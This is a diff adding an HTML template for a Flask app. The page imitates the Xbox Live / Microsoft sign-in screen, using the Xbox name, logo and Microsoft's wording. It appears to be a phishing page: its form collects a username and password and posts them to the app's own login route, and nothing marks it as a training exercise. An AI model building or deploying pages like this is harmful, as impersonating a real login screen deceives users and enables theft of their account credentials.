@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xbox Live - Sign In</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #262626;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 16px;
+        }
+        .xbox-container {
+            width: 100%;
+            max-width: 440px;
+            background: #262626;
+            border-radius: 2px;
+            padding: 44px 44px 36px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            border-top: 4px solid #107c41;
+        }
+        .xbox-header { display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }
+        .xbox-logo { width: 32px; height: 32px; }
+        .xbox-brand { font-size: 20px; font-weight: 600; letter-spacing: -0.3px; }
+        .xbox-title { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        .xbox-subtitle { font-size: 15px; color: #ccc; margin-bottom: 24px; }
+        .xbox-form { display: flex; flex-direction: column; gap: 16px; }
+        .xbox-input {
+            width: 100%;
+            height: 36px;
+            background: #333;
+            border: 1px solid #555;
+            border-radius: 0;
+            padding: 0 10px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+        }
+        .xbox-input:focus { border-color: #107c41; background: #1f1f1f; }
+        .xbox-actions { display: flex; justify-content: flex-end; margin-top: 20px; }
+        .xbox-btn {
+            background: #107c41;
+            color: #fff;
+            border: none;
+            padding: 6px 36px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            min-height: 32px;
+            transition: background 0.15s;
+        }
+        .xbox-btn:hover { background: #128e4a; }
+        .xbox-footer-link { font-size: 13px; color: #107c41; text-decoration: none; }
+        .xbox-footer-link:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="xbox-container">
+        <div class="xbox-header">
+            <svg class="xbox-logo" viewBox="0 0 24 24" fill="#107c41">
+                <path d="M11.96 23.834C5.352 23.834 0 18.481 0 11.874 0 5.266 5.352-.086 11.96-.086c6.608 0 11.96 5.352 11.96 11.96 0 6.607-5.352 11.96-11.96 11.96zm6.815-14.773c-.563-.847-2.611-3.214-5.315-4.475-.729-.336-1.229-.462-1.5-.462-.271 0-.771.126-1.5.462-2.704 1.261-4.752 3.628-5.315 4.475-.245.369-.296.643-.296.84 0 .807 1.832 3.864 3.731 5.32 1.488 1.141 2.805 1.636 3.38 1.636.575 0 1.892-.495 3.38-1.636 1.899-1.456 3.731-4.513 3.731-5.32 0-.197-.051-.471-.296-.84z"/>
+            </svg>
+            <span class="xbox-brand">Xbox Live</span>
+        </div>
+
+        <h1 class="xbox-title">Sign in</h1>
+        <p class="xbox-subtitle">to continue to Xbox services</p>
+
+        <form class="xbox-form" action="{{ url_for('login') }}" method="POST">
+            <input type="text" name="username" class="xbox-input" placeholder="Email, phone, or Skype" required />
+
+            <!-- Added password field -->
+            <input type="password" name="password" class="xbox-input" placeholder="Password" required />
+
+            <div style="margin-top: 8px;">
+                <span style="font-size: 13px; color: #ccc;">No account? </span>
+                <a href="#" class="xbox-footer-link">Create one!</a>
+            </div>
+
+            <div class="xbox-actions">
+                <button type="submit" class="xbox-btn">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
